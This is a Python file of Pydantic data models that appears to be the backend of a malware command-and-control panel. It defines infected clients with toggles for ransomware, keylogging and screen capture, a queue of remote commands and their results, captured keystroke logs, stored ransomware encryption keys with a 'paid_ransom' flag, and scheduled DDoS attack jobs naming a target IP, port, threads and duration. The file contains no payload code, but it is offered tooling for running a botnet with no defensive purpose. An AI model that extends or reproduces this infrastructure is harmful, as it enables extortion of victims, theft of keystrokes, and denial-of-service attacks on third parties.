from pydantic import BaseModel
from typing import Optional
from datetime import datetime


class ClientBase(BaseModel):
    client_id: str
    ip_address: str
    operating_system: str
    ransomware: bool = False
    keylogger: bool = True
    screencapture: bool = True
    cifrado: bool = False

class ClientCreate(ClientBase):
    pass

class ClientUpdate(BaseModel):
    ransomware: Optional[bool] = None
    keylogger: Optional[bool] = None
    screencapture: Optional[bool] = None
    cifrado: Optional[bool] = None
   
class Client(ClientBase):
    id: int
    last_seen: datetime
    is_active: bool

    class Config:
        orm_mode = True

class CommandBase(BaseModel):
    command: str


class CommandUpdate(BaseModel):
    command: Optional[str] = None
    executed: Optional[bool] = None
    execution_time: Optional[datetime] = None
    result: Optional[str] = None


class CommandCreate(CommandBase):
    client_id: int

class Command(CommandBase):
    id: int
    client_id: int
    executed: bool
    execution_time: Optional[datetime]
    result: Optional[str]

    class Config:
        orm_mode = True
        

class AdminBase(BaseModel):
    username: str


class AdminCreate(AdminBase):
    password: str


class Admin(AdminBase):
    id: int

    class Config:
        orm_mode = True


class KeystrokeLogBase(BaseModel):
    text: str

class KeystrokeLogCreate(BaseModel):
    client_id: int
    text: str

class KeystrokeLog(KeystrokeLogBase):
    id: int
    client_id: int
    timestamp: datetime
    text: str

    class Config:
        orm_mode = True

class KeystrokeLogUpdate(BaseModel):
    text: Optional[str] = None

class RansomwareDataUpdate(BaseModel):
    key: Optional[str] = None
    iv: Optional[str] = None
    paid_ransom: Optional[bool] = None

    class Config:
        orm_mode = True


class RansomwareDataBase(BaseModel):
    key: str
    iv: str
    paid_ransom: bool = False
    created_at: Optional[datetime] = None

class RansomwareDataCreate(RansomwareDataBase):
    client_id: int

class RansomwareDataCreateOrUpdate(BaseModel):
    key: Optional[str] = None
    iv: Optional[str] = None
    paid_ransom: Optional[bool] = None


class RansomwareData(RansomwareDataBase):
    id: int
    client_id: int

    class Config:
        orm_mode = True

class DDoSAttackBase(BaseModel):
    ip: str
    port: int
    threads: int
    duration: int
    scheduled_time: str

class DDoSAttackCreateOrUpdate(BaseModel):
    ip: Optional[str] = None
    port: Optional[int] = None
    threads: Optional[int] = None
    duration: Optional[int] = None
    scheduled_time: Optional[str] = None

    class Config:
        orm_mode = True

class DDoSAttackUpdate(BaseModel):
    ip: Optional[str] = None
    port: Optional[int] = None
    threads: Optional[int] = None
    duration: Optional[int] = None

class DDoSAttackCreate(DDoSAttackBase):
    pass

class DDoSAttack(DDoSAttackBase):
    id: int

    class Config:
        orm_mode = True
